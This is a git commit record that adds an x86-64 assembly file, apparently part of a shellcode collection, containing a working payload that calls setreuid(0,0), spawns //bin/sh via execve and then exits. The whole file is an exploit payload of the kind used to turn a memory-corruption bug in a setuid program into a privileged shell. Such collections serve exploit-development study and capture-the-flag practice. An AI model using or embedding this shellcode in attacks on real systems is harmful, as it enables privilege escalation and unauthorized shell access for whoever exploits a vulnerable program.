61733af27597d240f9c845c5d55b1b6ff817b4e9
xl00t <0xl00t@protonmail.com>
2023-12-21 15:48:16 +0100

    Added setreuid syscall shellcode

---
+++ shellcodes/src/bin_sh_setreuid.asm
@@ -0,0 +1,36 @@
+; setreuid and then execute /bin/sh
+; %rax	System call	%rdi	%rsi	%rdx	%r10	%r8	%r9
+; 59	sys_execve	const char *filename	const char *const argv[]	const char *const envp[]
+; 60	sys_exit	int error_code
+; 113	sys_setreuid	uid_t ruid	uid_t euid
+
+BITS 64
+section .text
+global _start
+_start:
+
+    push 113  ; set sys_setreuid syscal number to rax
+    pop rax
+    xor rdi, rdi ; set 0 to rdi
+    xor rsi, rsi ; set 0 to rsi
+    syscall
+
+    push 59  ; set sys_execve syscal number to rax
+    pop rax
+        
+    xor rbx , rbx   ; set NULL to rbx
+    push rbx        ; push rbx to stack
+
+    mov rbx, 0x68732f6e69622f2f ; //bin/sh
+    push rbx                    ; set //bin/sh to the stack
+
+    mov rdi, rsp ; set //bin/sh to rdi
+    xor rsi, rsi ; set NULL to rsi
+    xor rdx, rdx ; set NULL to rdx
+    syscall
+
+
+    xor rdi, rdi  ; set 0 to rdi
+    push 60  ; set sys_exit syscal number to rax
+    pop rax
+    syscall
